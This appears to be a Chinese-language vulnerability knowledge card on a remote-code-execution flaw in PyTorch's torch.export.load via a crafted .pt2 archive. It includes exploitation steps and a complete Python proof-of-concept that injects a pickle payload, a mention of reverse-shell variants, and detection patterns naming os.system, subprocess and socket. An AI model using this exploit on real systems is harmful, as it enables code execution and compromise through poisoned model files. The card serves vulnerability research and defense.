---
id: ai-security-supply-chain-pytorch-export-load-use-pickle-rce
title: PyTorch torch.export.load 信任 .pt2 内 use_pickle：恶意 model_weights_config.json 触发 weights_only=False 反序列化 RCE
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: pytorch-export-load-use-pickle-deserialization-rce
aliases:
- torch.export.load RCE
- .pt2 恶意模型
- model_weights_config.json use_pickle
- weights_only=False 反序列化
- PyTorch 模型加载 RCE
tags:
- ai-supply-chain
- pytorch
- pt2
- torch-export
- pickle
- deserialization
- rce
- model-loading
- weights-only
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V156
  verified_at: '2026-11-06T07:32:15+08:00'
  notes: 已对照原文全文与2张图核对：.pt2为ZIP、model_weights_config.json插入use_pickle=true记录、saved payload写入data/weights/、load_pt2→_load_exported_programs→_load_state_dict在use_pickle分支调用torch.load(...,weights_only=False)、torch.export.load签名无weights_only参数、2.6起torch.load默认True等均与原文及截图（calc.exe被拉起后Load抛RuntimeError）一致。未验证点：PoC未本机复跑（需安装torch并执行恶意载荷）；原文未给CVE/受影响版本，未设置versions；frontmatter无sources/source_url。
---

## 一句话结论

构造一个合法的 `.pt2` 模型档案，在 `model_weights_config.json` 的 `config` 中插入一条 `use_pickle: true` 的记录并在对应 `data/weights/<path_name>` 放入 pickle 载荷；受害者调用 `torch.export.load()` 时，内部 `_load_state_dict` 会以 `weights_only=False` 调用 `torch.load`，加载即执行任意代码。由于 `torch.export.load` 的公开签名根本没有 `weights_only` 参数，调用方无法在代码层加固。

## 原理

- `torch.export.save` 把模型导出为 `.pt2`（本质是 ZIP），其中 `model_weights_config.json` 描述每个权重 FQN 如何加载：`path_name` 指向 `data/weights/` 下的文件，`is_param` 决定是否包装成 Parameter，`use_pickle` 决定是否走 pickle 反序列化，`tensor_meta` 描述 dtype/shape/stride 等。
- 加载链为 `torch.export.load → load_pt2 → _load_exported_programs → _load_state_dict`。`_load_state_dict` 遍历 `weights_config.config.items()`：当某条记录的 `use_pickle` 为真时，读取 `data/weights/<path_name>` 的字节并执行 `torch.load(io.BytesIO(weight_bytes), weights_only=False)`。
- `weights_only=False` 会启用完整 pickle 反序列化。pickle 在还原对象时执行 `__reduce__` 返回的 callable 与参数，因此攻击者只要让 `__reduce__` 返回 `(os.system, (cmd,))`，加载档案就会执行命令。
- 关键安全问题在于“配置由文件自己提供”：`model_weights_config.json` 是攻击者完全可控的 ZIP 内文件，`use_pickle` 是其中的普通布尔字段；`torch.export.load` 没有任何参数可覆盖它，也没有对 `use_pickle=true` 的记录做来源或内容校验。
- 这与 `torch.load` 在 PyTorch 2.6 起默认 `weights_only=True` 的“安全默认”形成反差：`torch.export.load` 内部硬编码 `weights_only=False`，使“只加载模型权重”的预期被文件内的一个字段绕过；官方 docstring 虽警告“Never load data from an untrusted source”，但 API 层没有提供强制安全的开关。
- `.pt2` 可以同时保留合法的模型结构与权重，受害者加载后仍能得到可用的 `ExportedProgram`，恶意记录只是额外插入的一条 `config` 项，因此从外观和常规使用上都难以察觉。

## 触发条件

- 受害者使用 `torch.export.load()`（或直接 `load_pt2`）加载不可信来源的 `.pt2` 档案。
- 目标 PyTorch 版本包含上述 `_load_state_dict` 逻辑，且 `use_pickle` 字段被信任（原文以 `pip install torch` 的当前版本复现）。
- 攻击者能生成/修改 `.pt2` 并通过模型仓库、邮件、CI 制品、共享目录等方式投递。
- 加载进程没有在加载前检查 ZIP 内的 `model_weights_config.json`，也没有对 pickle 做静态扫描或沙箱隔离。
- 运行加载进程的用户具备命令执行权限（通常就是开发者/训练节点权限）。

## 利用步骤

1. 用官方接口生成一个合法模板：定义简单 `torch.nn.Module`，调用 `export(model, example_inputs)` 与 `save(ep, "benign.pt2")`。
2. 构造恶意对象：实现 `__reduce__` 返回 `(os.system, ("id > /tmp/pt2_pwned",))` 或反弹 Shell 命令，`pickle.dumps` 得到载荷字节。
3. 重新打包 ZIP：逐条复制 `benign.pt2` 的所有条目；读到 `model_weights_config.json` 时解析 JSON，向 `config` 插入 `malicious_rce` 记录：`{"path_name": "malicious_payload", "is_param": false, "use_pickle": true, "tensor_meta": null}`；其余内容保持不变。
4. 把 pickle 载荷写入 ZIP 内 `data/weights/malicious_payload`（目录前缀取 ZIP 第一项的根目录，如 `benign/`）。
5. 受害者执行 `torch.export.load("malicious.pt2")`；`_load_state_dict` 命中 `use_pickle` 分支，`torch.load(..., weights_only=False)` 反序列化并执行命令。
6. 即使加载随后因结构不完整抛出 `RuntimeError`，命令已经在反序列化阶段执行；原文截图即为 `calc.exe` 被拉起后 `torch.export.load` 报错。

## PoC

```python
import os, io, json, pickle, zipfile
import torch
from torch.export import export, save, load

class MyModule(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.w = torch.nn.Parameter(torch.randn(1))
    def forward(self, x):
        return x + self.w

# 1) 合法模板
save(export(MyModule(), (torch.randn(1),)), "benign.pt2")

# 2) pickle 载荷：仅执行无害命令验证代码执行
class Malicious:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pt2_pwned",))

payload = pickle.dumps(Malicious())

# 3) 改写配置并注入载荷
with zipfile.ZipFile("benign.pt2", "r") as zin:
    root = zin.namelist()[0].split("/")[0]
    with zipfile.ZipFile("malicious.pt2", "w") as zout:
        for item in zin.infolist():
            content = zin.read(item.filename)
            if item.filename.endswith("model_weights_config.json"):
                config = json.loads(content.decode("utf-8"))
                config["config"]["malicious_rce"] = {
                    "path_name": "malicious_payload",
                    "is_param": False,
                    "use_pickle": True,
                    "tensor_meta": None,
                }
                content = json.dumps(config).encode("utf-8")
            zout.writestr(item, content)
        zout.writestr(f"{root}/data/weights/malicious_payload", payload)

# 4) 受害者侧触发
load("malicious.pt2")   # _load_state_dict -> torch.load(..., weights_only=False)
```

## 变体与关联

- 变体：把恶意记录命名成任何权重名（如 `w2`、`layer.weight`），或插入多条 `use_pickle` 记录；`path_name` 可指向 ZIP 内任意路径的载荷文件。
- 变体：通过模型仓库/内部模型市场分发 `.pt2`，或把它伪装成“已导出/已编译模型”放入 CI 制品、推理服务挂载目录，诱使受害者用 `torch.export.load` 加载。
- 变体：同类“文件内配置决定反序列化安全性”的模式也可能出现在其他框架的打包加载器中；审计时应重点检查从归档 JSON 读取 `use_pickle`/`weights_only`/`trust_remote_code` 等安全开关的路径。
- 关联：[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（传统 `torch.load` 恶意模型；本卡是 `torch.export.load` 内部强制 `weights_only=False` 的新路径）、[[web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce]]（应用层裸调 `torch.load`）。
- 关联：[[ai-security-supply-chain-invokeai-model-install-picklescan-suspicious-fail-open-rce]]（模型安装扫描 fail-open；本卡是加载器自身信任归档配置）。
- 边界：原文未给出 CVE 编号与受影响版本区间；利用依赖 `torch.export` 的 `.pt2` 归档格式，旧版本无此路径或字段结构不同，需按目标版本核对。

## 检测与防御

- 检测：在加载前检查 `.pt2` ZIP 内 `model_weights_config.json`，拒绝任何 `use_pickle: true` 的记录；扫描 `data/weights/` 下非 tensor 格式的 pickle 字节（`GLOBAL`/`STACK_GLOBAL`/`os.system`/`subprocess`/`socket` 等）；监控 `torch.export.load` 进程拉起 shell/计算器等异常子进程。
- 修复：在 `_load_state_dict` 中把 `torch.load(..., weights_only=False)` 改为 `weights_only=True`，或对归档中的 `use_pickle` 记录直接拒绝（只允许框架内部可信来源使用）；为 `torch.export.load` 暴露可覆盖的 `weights_only` 参数并默认安全。
- 加固：把不可信 `.pt2` 当作可执行代码，加载前在无网络、低权限、只读文件系统的沙箱/容器中进行；优先使用 `safetensors` 等纯权重格式；固定模型 revision 并校验 hash/签名。
- 防御：模型市场与 CI 对上传的 `.pt2` 做结构审计与 pickle 扫描；推理服务不要加载用户可控的模型档案；对加载进程的出站网络与子进程行为做运行时监控。
